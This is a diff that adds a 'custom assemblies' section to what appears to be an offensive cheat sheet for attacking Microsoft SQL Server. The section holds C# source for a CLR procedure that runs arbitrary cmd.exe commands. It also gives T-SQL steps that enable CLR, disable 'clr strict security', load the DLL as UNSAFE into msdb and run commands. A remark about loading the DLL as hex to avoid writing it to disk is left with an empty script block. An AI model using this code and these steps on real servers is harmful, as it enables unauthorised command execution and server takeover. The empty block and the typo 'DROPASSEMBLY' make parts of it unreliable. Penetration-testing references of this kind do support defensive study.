@@ -48,6 +48,7 @@ C:\> sqlcmd -S 192.168.1.2 -U 'svc_sql' -P 'SqlTest123!' -> SQL server login
 
 C:\> sqlcmd -E appsrv01.contoso.com -> Kerberos login
 ```
+(Note that when using the sqlcmd utility, you need to type "GO" in order to run your queries, if you don't type "GO" your queries won't be executed)
 
 IMPORTANT: Mainly all commands specified in this document are meant to be thrown through an impacket-mssqlclient or sqlcmd shell.
 
@@ -142,6 +143,77 @@ However, since "sp_oacreate" and "sp_oamethod" are disabled by default we must f
 
 ```
 1. EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+```
+
+**CUSTOM ASSEMBLIES:**
+
+Databases with the "TRUSTWORTHY" property set, can also import managed DLL as objects through the "CREATE ASSEMBLY" statement. So we will try to abuse this. (In our example we will target the "msdb" database)
+
+Managed DLL code:
+
+```
+using System;
+using Microsoft.SqlServer.Server;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+
+public class StoredProcedures
+{
+  [Microsoft.SqlServer.Server.SqlProcedure]
+   public static void cmdExec (SqlString execCommand)
+   {
+     Process proc = new Process();
+     proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+     proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
+     proc.StartInfo.UseShellExecute = false;
+     proc.StartInfo.RedirectStandardOutput = true;
+     proc.Start();
+     SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
+     SqlContext.Pipe.SendResultsStart(record);
+     record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+     SqlContext.Pipe.SendResultsRow(record);
+     SqlContext.Pipe.SendResultsEnd();
+     proc.WaitForExit();
+     proc.Close();
+   }
+};
+```
+
+Now, we need to enable the CLR Integration, and disable the "clr strict security" option:
+
+```
+1. use msdb;
+
+2. EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+
+3. EXEC sp_configure 'clr enabled',1; RECONFIGURE;
+
+4. EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
+```
+
+Now, we will create the assembly and a procedure for it:
+
+```
+1. CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
+
+2. CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
+
+3. EXEC cmdExec 'whoami'
+```
+
+To drop an assembly and its procedures:
+
+```
+1. DROP PROCEDURE dbo.cmdExec;
+
+2. DROPASSEMBLY myAssembly;
+```
+
+In order to avoid to put our DLL on disk, we can convert it to hexadecimal and use the "CREATE ASSEMBLY" statement with the hex string of our DLL. 
+
+To convert our DLL to an hexadecimal string we will use this powershell script:
+
+```
 ```
 
 **CODE EXECUTION ON A LINKED MSSQL SERVER:**
